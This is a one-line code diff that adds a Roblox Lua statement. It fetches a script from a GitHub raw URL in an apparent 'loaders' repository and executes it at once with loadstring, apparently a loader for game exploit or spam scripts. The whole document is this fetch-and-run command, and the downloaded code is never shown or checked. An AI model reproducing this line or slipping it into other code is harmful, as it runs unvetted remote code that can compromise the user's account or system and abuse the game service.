@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/scrooms-spam6-9v0ujs4bjqtx2r.lua"))()
